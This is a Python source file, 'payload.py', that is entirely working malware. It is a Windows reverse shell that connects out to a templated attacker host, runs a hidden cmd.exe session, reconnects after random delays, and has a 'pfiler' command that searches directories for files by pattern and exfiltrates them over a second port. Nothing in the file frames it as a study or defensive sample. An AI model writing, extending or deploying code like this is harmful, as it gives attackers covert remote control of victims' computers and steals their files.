# payload.py
# The Heartbeat Soul, reborn with clairvoyant file-finding and immediate responsiveness.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import fnmatch
import struct
import json

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
# --------------------

FILE_PORT = RPORT + 1

def send_msg(sock, data):
    """Wraps data with a 4-byte length header and sends it."""
    try:
        msg = struct.pack('>I', len(data)) + data
        sock.sendall(msg)
        return True
    except (ConnectionResetError, BrokenPipeError):
        return False

def recv_msg(sock):
    """Receives a 4-byte length header and then the exact amount of data."""
    try:
        raw_msglen = sock.recv(4)
        if not raw_msglen: return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        data = b''
        while len(data) < msglen:
            packet = sock.recv(msglen - len(data))
            if not packet: return None
            data += packet
        return data
    except (ConnectionResetError, BrokenPipeError):
        return None

def calculate_sha256(file_path):
    """Calculates the SHA256 hash of a file."""
    sha = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(4096), b''):
                sha.update(block)
        return sha.hexdigest()
    except:
        return None

def find_files(start_path, patterns):
    """Recursively finds files matching a list of patterns."""
    found_files = set() # Use a set to automatically handle duplicates
    search_dir = os.path.abspath(start_path)
    for root, _, files in os.walk(search_dir):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                full_path = os.path.join(root, filename)
                if os.access(full_path, os.R_OK):
                    found_files.add(full_path)
    return list(found_files)

def handle_pfiler_command(command, main_conn):
    """
    Parses pfiler command with superior logic, provides instant feedback,
    and transfers all found files through a dedicated, unbreakable conduit.
    """
    try:
        # --- IMMEDIATE FEEDBACK ---
        # Announce the start of the operation over the MAIN command channel.
        feedback = b"\n[pfiler] Acknowledged. Searching for specified files... This may take a moment on large directories.\n"
        main_conn.sendall(feedback)
        
        # --- CLAIRVOYANT PARSING LOGIC ---
        parts = command.strip().split()[1:]
        if not parts:
            main_conn.sendall(b"[pfiler] Error: No path or patterns specified.\n")
            return

        search_path = "."
        raw_patterns = []

        # Intelligently determine if the first argument is a path or a pattern
        if os.path.isdir(parts[0]):
            search_path = parts[0]
            raw_patterns = parts[1:]
            if not raw_patterns: # If only a directory is given, grab everything
                raw_patterns = ['*']
        else:
            search_path = "."
            raw_patterns = parts

        # Convert simple words (e.g., "pdf") into proper patterns (e.g., "*.pdf")
        patterns = []
        for p in raw_patterns:
            if "*" not in p and "?" not in p:
                patterns.append(f"*.{p}")
            else:
                patterns.append(p)
        
        files_to_send = find_files(search_path, patterns)
        
        if not files_to_send:
            main_conn.sendall(b"[pfiler] Search complete. No matching files found or accessible.\n")
            return

        main_conn.sendall(f"[pfiler] Found {len(files_to_send)} files. Initiating transfer in the background.\n".encode('utf-8'))

        # --- UNBREAKABLE TRANSFER PROTOCOL ---
        s_file = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_file.connect((RHOST, FILE_PORT))

        try:
            start_msg = json.dumps({'type': 'START_TRANSFER', 'file_count': len(files_to_send)}).encode('utf-8')
            if not send_msg(s_file, start_msg): return

            for file_path in files_to_send:
                try:
                    relative_path = os.path.basename(file_path)
                    file_size = os.path.getsize(file_path)
                    file_hash = calculate_sha256(file_path)
                    if not file_hash: continue

                    header_data = {'type': 'FILE_HEADER', 'path': relative_path, 'size': file_size, 'hash': file_hash}
                    header_msg = json.dumps(header_data).encode('utf-8')
                    if not send_msg(s_file, header_msg): break

                    with open(file_path, 'rb') as f:
                        while True:
                            chunk = f.read(4096)
                            if not chunk: break
                            s_file.sendall(chunk)
                    
                    ack_msg = recv_msg(s_file)
                    if not ack_msg: break

                except Exception:
                    continue

            end_msg = json.dumps({'type': 'END_TRANSFER'}).encode('utf-8')
            send_msg(s_file, end_msg)
        finally:
            s_file.close()

    except Exception:
        # Fails silently to the file channel, but the main shell must not be disturbed
        try:
            main_conn.sendall(b"[pfiler] A critical error occurred during the file transfer setup.\n")
        except:
            pass

def run_conduit():
    """Main reverse shell loop."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
            
            stop_event = threading.Event()
            def pipe_stream(stream, sock):
                while not stop_event.is_set():
                    try:
                        data = stream.read(1)
                        if data: sock.sendall(data)
                        else: break
                    except: break

            threading.Thread(target=pipe_stream, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=pipe_stream, args=(p.stderr, s_obj), daemon=True).start()
            
            while not stop_event.is_set():
                try:
                    data = s_obj.recv(1024)
                    if not data: break
                    
                    command_str = data.decode('utf-8', errors='ignore').strip()
                    if command_str.lower().startswith('pfiler '):
                        # The thread now receives the main socket to provide feedback
                        pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(command_str, s_obj), daemon=True)
                        pfiler_thread.start()
                    else:
                        p.stdin.write(data)
                        p.stdin.flush()
                except: break
            
            stop_event.set()
            p.terminate()
            s_obj.close()
        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()